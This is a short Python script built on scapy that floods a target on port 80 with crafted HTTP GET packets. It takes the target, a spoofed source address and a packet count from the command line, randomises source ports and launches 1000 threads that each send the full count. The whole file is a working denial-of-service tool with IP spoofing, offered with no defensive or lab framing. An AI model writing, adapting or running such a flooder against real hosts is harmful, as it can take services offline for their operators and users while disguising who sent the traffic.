from scapy.all import *
import random
import sys
import threading

dest = sys.argv[1]
sourceAddr = sys.argv[2]
packt_count = int(sys.argv[3])

def main():
        
        getStr = 'GET / HTTP/1.1 \r\nHost:' + dest + '\r\nAccept-Encoding:gzip, deflate\r\n' + 'Connection: keep-alive\r\n' + 'Upgrade-Insecure-Requests: 1\r\n' + \
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36\r\n' + \
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n' + \
                'Accept-Language: en-US,en;q=0.9\r\n\r\n'


        send((IP(src=sourceAddr, dst=dest) / TCP(sport=random.randint(1025, 65500),
                           dport=80, flags='P''A') / getStr), verbose=False, count=packt_count)
        
 


def start_app():
    for item in range(1000):
        x = threading.Thread(target=main)
        x.start()


start_app()
print(packt_count, " requests  send")
